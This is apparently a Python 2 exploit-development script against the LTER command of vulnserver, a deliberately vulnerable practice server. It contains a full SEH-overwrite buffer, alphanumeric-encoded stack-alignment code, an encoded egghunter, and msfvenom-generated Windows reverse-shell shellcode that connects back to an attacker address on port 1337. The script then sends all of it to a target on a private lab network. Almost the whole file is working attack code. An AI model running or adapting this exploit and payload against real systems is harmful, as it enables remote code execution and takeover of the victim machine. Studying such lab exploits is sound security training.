#!/usr/bin/python

import socket
import sys

host = "192.168.160.106"
port = 9999

#########################################
## WriTTen by: van6uard
## vulnserver LTER Exploit
## Log data, item 14
## Address=6250120B
## Message=  0x6250120b : pop ecx # pop ecx # ret  | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\van6uard\Desktop\vulnserver-master\essfunc.dll)

jump = "\x51\x58"
jump += "\x66\x05\x40\x12"
jump += "\x50\x5c"
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x13\x77\x61\x41" ## add  eax, 0x41617713
jump += "\x05\x12\x66\x62\x41" ## add  eax, 0x41626612
jump += "\x05\x12\x55\x41\x41" ## add  eax, 0x41415512
jump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
jump += "\x50"                 ## push eax
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x33\x41\x61\x45" ## add  eax, 0x45614133
jump += "\x05\x33\x40\x60\x44" ## add  eax, 0x44604033
jump += "\x50"                 ## push eax

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.160.104 LPORT=1337 -f python -b "\x00" -v shellcode EXITFUNC=thread
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 11 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of python file: 1900 bytes
shellcode =  ""
shellcode += "w00tw00t"
shellcode += "\xba\xb5\x5d\x1b\xfd\xd9\xee\xd9\x74\x24\xf4\x5f"
shellcode += "\x33\xc9\xb1\x52\x31\x57\x12\x83\xc7\x04\x03\xe2"
shellcode += "\x53\xf9\x08\xf0\x84\x7f\xf2\x08\x55\xe0\x7a\xed"
shellcode += "\x64\x20\x18\x66\xd6\x90\x6a\x2a\xdb\x5b\x3e\xde"
shellcode += "\x68\x29\x97\xd1\xd9\x84\xc1\xdc\xda\xb5\x32\x7f"
shellcode += "\x59\xc4\x66\x5f\x60\x07\x7b\x9e\xa5\x7a\x76\xf2"
shellcode += "\x7e\xf0\x25\xe2\x0b\x4c\xf6\x89\x40\x40\x7e\x6e"
shellcode += "\x10\x63\xaf\x21\x2a\x3a\x6f\xc0\xff\x36\x26\xda"
shellcode += "\x1c\x72\xf0\x51\xd6\x08\x03\xb3\x26\xf0\xa8\xfa"
shellcode += "\x86\x03\xb0\x3b\x20\xfc\xc7\x35\x52\x81\xdf\x82"
shellcode += "\x28\x5d\x55\x10\x8a\x16\xcd\xfc\x2a\xfa\x88\x77"
shellcode += "\x20\xb7\xdf\xdf\x25\x46\x33\x54\x51\xc3\xb2\xba"
shellcode += "\xd3\x97\x90\x1e\xbf\x4c\xb8\x07\x65\x22\xc5\x57"
shellcode += "\xc6\x9b\x63\x1c\xeb\xc8\x19\x7f\x64\x3c\x10\x7f"
shellcode += "\x74\x2a\x23\x0c\x46\xf5\x9f\x9a\xea\x7e\x06\x5d"
shellcode += "\x0c\x55\xfe\xf1\xf3\x56\xff\xd8\x37\x02\xaf\x72"
shellcode += "\x91\x2b\x24\x82\x1e\xfe\xeb\xd2\xb0\x51\x4c\x82"
shellcode += "\x70\x02\x24\xc8\x7e\x7d\x54\xf3\x54\x16\xff\x0e"
shellcode += "\x3f\xd9\xa8\xb0\xd7\xb1\xaa\xb0\x22\x7b\x22\x56"
shellcode += "\x46\x6b\x62\xc1\xff\x12\x2f\x99\x9e\xdb\xe5\xe4"
shellcode += "\xa1\x50\x0a\x19\x6f\x91\x67\x09\x18\x51\x32\x73"
shellcode += "\x8f\x6e\xe8\x1b\x53\xfc\x77\xdb\x1a\x1d\x20\x8c"
shellcode += "\x4b\xd3\x39\x58\x66\x4a\x90\x7e\x7b\x0a\xdb\x3a"
shellcode += "\xa0\xef\xe2\xc3\x25\x4b\xc1\xd3\xf3\x54\x4d\x87"
shellcode += "\xab\x02\x1b\x71\x0a\xfd\xed\x2b\xc4\x52\xa4\xbb"
shellcode += "\x91\x98\x77\xbd\x9d\xf4\x01\x21\x2f\xa1\x57\x5e"
shellcode += "\x80\x25\x50\x27\xfc\xd5\x9f\xf2\x44\xf5\x7d\xd6"
shellcode += "\xb0\x9e\xdb\xb3\x78\xc3\xdb\x6e\xbe\xfa\x5f\x9a"
shellcode += "\x3f\xf9\x40\xef\x3a\x45\xc7\x1c\x37\xd6\xa2\x22"
shellcode += "\xe4\xd7\xe6"

# msf-egghunter -f raw -e 'w00t' > /tmp/egg.bin
# ./alpha2 ecx --uppercase < /tmp/egg.bin
egghunter = "IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI3VK18JKODOG2PRBJS2F8XM6NWLUUQJ2TJOOH2WP06P44MYXWNO45JJNOCEM7KOZGA"

# plop shellcode first, then point a register to it. then egghunter after and align esp after 
buf = 'LTER /.:/' 
buf += egghunter
buf += 'A'*(3515-82-len(egghunter))
buf += jump
buf += 'B'*(82-len(jump))
buf += '\x77\x08\x76\x06'           # nSEH
buf += '\x0b\x12\x50\x62'           # SEH, pop pop retn
buf += '\x41'*2
buf += '\x54\x58'                   # push esp; push eax
buf += '\x66\x05\x50\x13'           # align ESP to correct address
buf += '\x50\x5c'                   # push eax; pop esp
buf += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
buf += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
buf += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
buf += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
buf += "\x50"                 ## push eax
buf += 'B'*(4200-3515-4-4-2-4-2)
buf += '\x00\x00'


try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    s.connect((host, port))
    s.send(shellcode)
    print s.recv(1024)
    print "[+] Evil 1st stage shellcode sent..."
    s.close()

    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
